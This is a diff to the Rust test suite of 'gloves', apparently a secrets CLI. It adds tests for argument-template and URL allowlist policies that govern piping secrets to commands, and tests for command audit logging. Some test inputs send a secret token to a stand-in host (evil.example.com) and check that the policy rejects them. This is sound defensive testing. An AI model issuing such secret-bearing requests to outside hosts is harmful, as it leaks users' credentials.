@@ -17,6 +17,8 @@ use std::os::unix::fs::PermissionsExt;
 const DAEMON_WAIT_ATTEMPTS: usize = 100;
 const DAEMON_WAIT_STEP_MILLIS: u64 = 20;
 const GET_PIPE_ALLOWLIST_ENV_VAR: &str = "GLOVES_GET_PIPE_ALLOWLIST";
+const GET_PIPE_ARG_POLICY_ENV_VAR: &str = "GLOVES_GET_PIPE_ARG_POLICY";
+const GET_PIPE_URL_POLICY_ENV_VAR: &str = "GLOVES_GET_PIPE_URL_POLICY";
 const REQUEST_ALLOWLIST_ENV_VAR: &str = "GLOVES_REQUEST_ALLOWLIST";
 const REQUEST_BLOCKLIST_ENV_VAR: &str = "GLOVES_REQUEST_BLOCKLIST";
 const TEST_PIPE_COMMAND: &str = "cat";
@@ -129,6 +131,21 @@ fn write_secret_acl_config(
         root.display(),
         toml_string_array(paths),
         toml_string_array(operations),
+    );
+    write_config(path, &content);
+}
+
+fn write_pipe_url_policy_config(
+    path: &Path,
+    root: &Path,
+    command: &str,
+    require_url: bool,
+    url_prefixes: &[&str],
+) {
+    let content = format!(
+        "version = 1\n[paths]\nroot = \"{}\"\n[secrets.pipe.commands.{command}]\nrequire_url = {require_url}\nurl_prefixes = {}\n",
+        root.display(),
+        toml_string_array(url_prefixes),
     );
     write_config(path, &content);
 }
@@ -1856,6 +1873,640 @@ printf '%s' "$1"
         .stderr(predicates::str::contains("{secret}"));
 }
 
+#[cfg(unix)]
+#[test]
+fn cli_get_pipe_to_args_policy_allows_only_matching_templates() {
+    let temp_dir = tempfile::tempdir().unwrap();
+    let root = temp_dir.path().to_str().unwrap();
+    let fake_bin = temp_dir.path().join("fake-bin");
+    fs::create_dir_all(&fake_bin).unwrap();
+    write_executable(
+        &fake_bin.join("print-arg"),
+        r#"#!/usr/bin/env bash
+set -euo pipefail
+printf '%s' "$1"
+"#,
+    );
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args([
+            "--root",
+            root,
+            "set",
+            "x",
+            "--value",
+            "secret-token",
+            "--ttl",
+            "1",
+        ])
+        .assert()
+        .success();
+
+    let policy = r#"{"print-arg":["print-arg prefix:{secret}:suffix"]}"#;
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .env("PATH", with_fake_path(&fake_bin))
+        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
+        .env(GET_PIPE_ARG_POLICY_ENV_VAR, policy)
+        .args([
+            "--root",
+            root,
+            "get",
+            "x",
+            "--pipe-to-args",
+            "print-arg prefix:{secret}:suffix",
+        ])
+        .assert()
+        .success()
+        .stdout(predicates::str::contains("prefix:secret-token:suffix"));
+}
+
+#[cfg(unix)]
+#[test]
+fn cli_get_pipe_to_args_policy_rejects_non_matching_templates() {
+    let temp_dir = tempfile::tempdir().unwrap();
+    let root = temp_dir.path().to_str().unwrap();
+    let fake_bin = temp_dir.path().join("fake-bin");
+    fs::create_dir_all(&fake_bin).unwrap();
+    write_executable(
+        &fake_bin.join("print-arg"),
+        r#"#!/usr/bin/env bash
+set -euo pipefail
+printf '%s' "$1"
+"#,
+    );
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args([
+            "--root",
+            root,
+            "set",
+            "x",
+            "--value",
+            "secret-token",
+            "--ttl",
+            "1",
+        ])
+        .assert()
+        .success();
+
+    let policy = r#"{"print-arg":["print-arg prefix:{secret}:suffix"]}"#;
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .env("PATH", with_fake_path(&fake_bin))
+        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
+        .env(GET_PIPE_ARG_POLICY_ENV_VAR, policy)
+        .args([
+            "--root",
+            root,
+            "get",
+            "x",
+            "--pipe-to-args",
+            "print-arg different:{secret}",
+        ])
+        .assert()
+        .failure()
+        .stderr(predicates::str::contains(
+            "not allowlisted by GLOVES_GET_PIPE_ARG_POLICY",
+        ));
+}
+
+#[cfg(unix)]
+#[test]
+fn cli_get_pipe_to_args_policy_requires_command_entry() {
+    let temp_dir = tempfile::tempdir().unwrap();
+    let root = temp_dir.path().to_str().unwrap();
+    let fake_bin = temp_dir.path().join("fake-bin");
+    fs::create_dir_all(&fake_bin).unwrap();
+    write_executable(
+        &fake_bin.join("print-arg"),
+        r#"#!/usr/bin/env bash
+set -euo pipefail
+printf '%s' "$1"
+"#,
+    );
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args([
+            "--root",
+            root,
+            "set",
+            "x",
+            "--value",
+            "secret-token",
+            "--ttl",
+            "1",
+        ])
+        .assert()
+        .success();
+
+    let policy = r#"{"cat":["cat {secret}"]}"#;
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .env("PATH", with_fake_path(&fake_bin))
+        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
+        .env(GET_PIPE_ARG_POLICY_ENV_VAR, policy)
+        .args([
+            "--root",
+            root,
+            "get",
+            "x",
+            "--pipe-to-args",
+            "print-arg prefix:{secret}:suffix",
+        ])
+        .assert()
+        .failure()
+        .stderr(predicates::str::contains(
+            "is not allowed by GLOVES_GET_PIPE_ARG_POLICY",
+        ));
+}
+
+#[cfg(unix)]
+#[test]
+fn cli_get_pipe_to_args_policy_rejects_invalid_json() {
+    let temp_dir = tempfile::tempdir().unwrap();
+    let root = temp_dir.path().to_str().unwrap();
+    let fake_bin = temp_dir.path().join("fake-bin");
+    fs::create_dir_all(&fake_bin).unwrap();
+    write_executable(
+        &fake_bin.join("print-arg"),
+        r#"#!/usr/bin/env bash
+set -euo pipefail
+printf '%s' "$1"
+"#,
+    );
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args([
+            "--root",
+            root,
+            "set",
+            "x",
+            "--value",
+            "secret-token",
+            "--ttl",
+            "1",
+        ])
+        .assert()
+        .success();
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .env("PATH", with_fake_path(&fake_bin))
+        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
+        .env(GET_PIPE_ARG_POLICY_ENV_VAR, "not-json")
+        .args([
+            "--root",
+            root,
+            "get",
+            "x",
+            "--pipe-to-args",
+            "print-arg prefix:{secret}:suffix",
+        ])
+        .assert()
+        .failure()
+        .stderr(predicates::str::contains(
+            "GLOVES_GET_PIPE_ARG_POLICY must be valid JSON",
+        ));
+}
+
+#[cfg(unix)]
+#[test]
+fn cli_get_pipe_to_args_url_policy_allows_same_url_with_different_payloads() {
+    let temp_dir = tempfile::tempdir().unwrap();
+    let root = temp_dir.path().to_str().unwrap();
+    let fake_bin = temp_dir.path().join("fake-bin");
+    fs::create_dir_all(&fake_bin).unwrap();
+    write_executable(
+        &fake_bin.join("print-arg"),
+        r#"#!/usr/bin/env bash
+set -euo pipefail
+printf '%s' "$1"
+"#,
+    );
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args([
+            "--root",
+            root,
+            "set",
+            "x",
+            "--value",
+            "secret-token",
+            "--ttl",
+            "1",
+        ])
+        .assert()
+        .success();
+
+    let url_policy = r#"{"print-arg":["https://api.example.com/v1/"]}"#;
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .env("PATH", with_fake_path(&fake_bin))
+        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
+        .env(GET_PIPE_URL_POLICY_ENV_VAR, url_policy)
+        .args([
+            "--root",
+            root,
+            "get",
+            "x",
+            "--pipe-to-args",
+            "print-arg auth:{secret} --data one https://api.example.com/v1/contacts",
+        ])
+        .assert()
+        .success()
+        .stdout(predicates::str::contains("auth:secret-token"));
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .env("PATH", with_fake_path(&fake_bin))
+        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
+        .env(GET_PIPE_URL_POLICY_ENV_VAR, url_policy)
+        .args([
+            "--root",
+            root,
+            "get",
+            "x",
+            "--pipe-to-args",
+            "print-arg auth:{secret} --data two https://api.example.com/v1/contacts",
+        ])
+        .assert()
+        .success()
+        .stdout(predicates::str::contains("auth:secret-token"));
+}
+
+#[cfg(unix)]
+#[test]
+fn cli_get_pipe_to_args_url_policy_rejects_other_urls() {
+    let temp_dir = tempfile::tempdir().unwrap();
+    let root = temp_dir.path().to_str().unwrap();
+    let fake_bin = temp_dir.path().join("fake-bin");
+    fs::create_dir_all(&fake_bin).unwrap();
+    write_executable(
+        &fake_bin.join("print-arg"),
+        r#"#!/usr/bin/env bash
+set -euo pipefail
+printf '%s' "$1"
+"#,
+    );
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args([
+            "--root",
+            root,
+            "set",
+            "x",
+            "--value",
+            "secret-token",
+            "--ttl",
+            "1",
+        ])
+        .assert()
+        .success();
+
+    let url_policy = r#"{"print-arg":["https://api.example.com/v1/"]}"#;
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .env("PATH", with_fake_path(&fake_bin))
+        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
+        .env(GET_PIPE_URL_POLICY_ENV_VAR, url_policy)
+        .args([
+            "--root",
+            root,
+            "get",
+            "x",
+            "--pipe-to-args",
+            "print-arg auth:{secret} --data one https://evil.example.com/contacts",
+        ])
+        .assert()
+        .failure()
+        .stderr(predicates::str::contains(
+            "not allowlisted by GLOVES_GET_PIPE_URL_POLICY",
+        ));
+}
+
+#[cfg(unix)]
+#[test]
+fn cli_get_pipe_to_args_url_policy_requires_url_argument() {
+    let temp_dir = tempfile::tempdir().unwrap();
+    let root = temp_dir.path().to_str().unwrap();
+    let fake_bin = temp_dir.path().join("fake-bin");
+    fs::create_dir_all(&fake_bin).unwrap();
+    write_executable(
+        &fake_bin.join("print-arg"),
+        r#"#!/usr/bin/env bash
+set -euo pipefail
+printf '%s' "$1"
+"#,
+    );
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args([
+            "--root",
+            root,
+            "set",
+            "x",
+            "--value",
+            "secret-token",
+            "--ttl",
+            "1",
+        ])
+        .assert()
+        .success();
+
+    let url_policy = r#"{"print-arg":["https://api.example.com/v1/"]}"#;
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .env("PATH", with_fake_path(&fake_bin))
+        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
+        .env(GET_PIPE_URL_POLICY_ENV_VAR, url_policy)
+        .args([
+            "--root",
+            root,
+            "get",
+            "x",
+            "--pipe-to-args",
+            "print-arg auth:{secret} --data one",
+        ])
+        .assert()
+        .failure()
+        .stderr(predicates::str::contains(
+            "must include at least one http(s) URL argument",
+        ));
+}
+
+#[cfg(unix)]
+#[test]
+fn cli_get_pipe_to_args_url_policy_rejects_invalid_json() {
+    let temp_dir = tempfile::tempdir().unwrap();
+    let root = temp_dir.path().to_str().unwrap();
+    let fake_bin = temp_dir.path().join("fake-bin");
+    fs::create_dir_all(&fake_bin).unwrap();
+    write_executable(
+        &fake_bin.join("print-arg"),
+        r#"#!/usr/bin/env bash
+set -euo pipefail
+printf '%s' "$1"
+"#,
+    );
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args([
+            "--root",
+            root,
+            "set",
+            "x",
+            "--value",
+            "secret-token",
+            "--ttl",
+            "1",
+        ])
+        .assert()
+        .success();
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .env("PATH", with_fake_path(&fake_bin))
+        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "print-arg")
+        .env(GET_PIPE_URL_POLICY_ENV_VAR, "not-json")
+        .args([
+            "--root",
+            root,
+            "get",
+            "x",
+            "--pipe-to-args",
+            "print-arg auth:{secret} https://api.example.com/v1/contacts",
+        ])
+        .assert()
+        .failure()
+        .stderr(predicates::str::contains(
+            "GLOVES_GET_PIPE_URL_POLICY must be valid JSON",
+        ));
+}
+
+#[cfg(unix)]
+#[test]
+fn cli_get_pipe_to_args_url_policy_supports_wget() {
+    let temp_dir = tempfile::tempdir().unwrap();
+    let root = temp_dir.path().to_str().unwrap();
+    let fake_bin = temp_dir.path().join("fake-bin");
+    fs::create_dir_all(&fake_bin).unwrap();
+    write_executable(
+        &fake_bin.join("wget"),
+        r#"#!/usr/bin/env bash
+set -euo pipefail
+printf '%s' "$2"
+"#,
+    );
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args([
+            "--root",
+            root,
+            "set",
+            "x",
+            "--value",
+            "secret-token",
+            "--ttl",
+            "1",
+        ])
+        .assert()
+        .success();
+
+    let url_policy = r#"{"wget":["https://api.example.com/v1/"]}"#;
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .env("PATH", with_fake_path(&fake_bin))
+        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "wget")
+        .env(GET_PIPE_URL_POLICY_ENV_VAR, url_policy)
+        .args([
+            "--root",
+            root,
+            "get",
+            "x",
+            "--pipe-to-args",
+            "wget --quiet https://api.example.com/v1/items?token={secret}",
+        ])
+        .assert()
+        .success()
+        .stdout(predicates::str::contains("token=secret-token"));
+}
+
+#[cfg(unix)]
+#[test]
+fn cli_get_pipe_to_args_url_policy_from_config_allows_configured_command() {
+    let temp_dir = tempfile::tempdir().unwrap();
+    let root = temp_dir.path().join("secrets");
+    let config_path = temp_dir.path().join(".gloves.toml");
+    let fake_bin = temp_dir.path().join("fake-bin");
+    fs::create_dir_all(&fake_bin).unwrap();
+    write_executable(
+        &fake_bin.join("applecli"),
+        r#"#!/usr/bin/env bash
+set -euo pipefail
+printf '%s' "$*"
+"#,
+    );
+    write_pipe_url_policy_config(
+        &config_path,
+        &root,
+        "applecli",
+        true,
+        &["https://api.example.com/v1/"],
+    );
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args([
+            "--config",
+            config_path.to_str().unwrap(),
+            "set",
+            "x",
+            "--value",
+            "secret-token",
+            "--ttl",
+            "1",
+        ])
+        .assert()
+        .success();
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .env("PATH", with_fake_path(&fake_bin))
+        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "applecli")
+        .args([
+            "--config",
+            config_path.to_str().unwrap(),
+            "get",
+            "x",
+            "--pipe-to-args",
+            "applecli --data one https://api.example.com/v1/contacts?token={secret}",
+        ])
+        .assert()
+        .success()
+        .stdout(predicates::str::contains("token=secret-token"));
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .env("PATH", with_fake_path(&fake_bin))
+        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "applecli")
+        .args([
+            "--config",
+            config_path.to_str().unwrap(),
+            "get",
+            "x",
+            "--pipe-to-args",
+            "applecli --data two https://api.example.com/v1/contacts?token={secret}",
+        ])
+        .assert()
+        .success()
+        .stdout(predicates::str::contains("token=secret-token"));
+}
+
+#[cfg(unix)]
+#[test]
+fn cli_get_pipe_to_args_url_policy_from_config_rejects_other_urls() {
+    let temp_dir = tempfile::tempdir().unwrap();
+    let root = temp_dir.path().join("secrets");
+    let config_path = temp_dir.path().join(".gloves.toml");
+    let fake_bin = temp_dir.path().join("fake-bin");
+    fs::create_dir_all(&fake_bin).unwrap();
+    write_executable(
+        &fake_bin.join("applecli"),
+        r#"#!/usr/bin/env bash
+set -euo pipefail
+printf '%s' "$*"
+"#,
+    );
+    write_pipe_url_policy_config(
+        &config_path,
+        &root,
+        "applecli",
+        true,
+        &["https://api.example.com/v1/"],
+    );
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args([
+            "--config",
+            config_path.to_str().unwrap(),
+            "set",
+            "x",
+            "--value",
+            "secret-token",
+            "--ttl",
+            "1",
+        ])
+        .assert()
+        .success();
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .env("PATH", with_fake_path(&fake_bin))
+        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "applecli")
+        .args([
+            "--config",
+            config_path.to_str().unwrap(),
+            "get",
+            "x",
+            "--pipe-to-args",
+            "applecli --data one https://evil.example.com/contacts?token={secret}",
+        ])
+        .assert()
+        .failure()
+        .stderr(predicates::str::contains(
+            "not allowlisted by .gloves.toml [secrets.pipe.commands.applecli]",
+        ));
+}
+
+#[cfg(unix)]
+#[test]
+fn cli_get_pipe_to_args_url_policy_from_config_requires_url_when_enabled() {
+    let temp_dir = tempfile::tempdir().unwrap();
+    let root = temp_dir.path().join("secrets");
+    let config_path = temp_dir.path().join(".gloves.toml");
+    let fake_bin = temp_dir.path().join("fake-bin");
+    fs::create_dir_all(&fake_bin).unwrap();
+    write_executable(
+        &fake_bin.join("applecli"),
+        r#"#!/usr/bin/env bash
+set -euo pipefail
+printf '%s' "$*"
+"#,
+    );
+    write_pipe_url_policy_config(
+        &config_path,
+        &root,
+        "applecli",
+        true,
+        &["https://api.example.com/v1/"],
+    );
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args([
+            "--config",
+            config_path.to_str().unwrap(),
+            "set",
+            "x",
+            "--value",
+            "secret-token",
+            "--ttl",
+            "1",
+        ])
+        .assert()
+        .success();
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .env("PATH", with_fake_path(&fake_bin))
+        .env(GET_PIPE_ALLOWLIST_ENV_VAR, "applecli")
+        .args([
+            "--config",
+            config_path.to_str().unwrap(),
+            "get",
+            "x",
+            "--pipe-to-args",
+            "applecli --data one token:{secret}",
+        ])
+        .assert()
+        .failure()
+        .stderr(predicates::str::contains(
+            "must include at least one http(s) URL argument",
+        ));
+}
+
 #[test]
 fn cli_get_pipe_to_args_rejects_non_utf8_secret_values() {
     let temp_dir = tempfile::tempdir().unwrap();
@@ -2260,6 +2911,57 @@ fn cli_list() {
         .assert()
         .success()
         .stdout(predicates::str::contains("["));
+}
+
+#[test]
+fn cli_audit_json_includes_command_events() {
+    let temp_dir = tempfile::tempdir().unwrap();
+    let root = temp_dir.path().to_str().unwrap();
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args(["--root", root, "init"])
+        .assert()
+        .success();
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args(["--root", root, "list"])
+        .assert()
+        .success();
+
+    let output = Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args(["--root", root, "audit", "--json", "--limit", "20"])
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+    let entries: serde_json::Value = serde_json::from_slice(&output).unwrap();
+    let entries = entries.as_array().unwrap();
+    assert!(entries.iter().any(|entry| {
+        entry["event"] == "command_executed"
+            && entry["command"] == "list"
+            && entry["interface"] == "cli"
+    }));
+}
+
+#[test]
+fn cli_audit_pretty_output_is_human_readable() {
+    let temp_dir = tempfile::tempdir().unwrap();
+    let root = temp_dir.path().to_str().unwrap();
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args(["--root", root, "init"])
+        .assert()
+        .success();
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args(["--root", root, "list"])
+        .assert()
+        .success();
+
+    Command::new(assert_cmd::cargo::cargo_bin!("gloves"))
+        .args(["--root", root, "audit", "--limit", "5"])
+        .assert()
+        .success()
+        .stdout(predicates::str::contains("\tcommand_executed\t"));
 }
 
 #[test]
@@ -3339,6 +4041,11 @@ fn cli_daemon_ping_roundtrip_over_tcp() {
 
     let status = child.wait().unwrap();
     assert!(status.success());
+
+    let audit = std::fs::read_to_string(temp_dir.path().join("audit.jsonl")).unwrap();
+    assert!(audit.contains("\"event\":\"command_executed\""));
+    assert!(audit.contains("\"interface\":\"daemon\""));
+    assert!(audit.contains("\"command\":\"ping\""));
 }
 
 #[test]
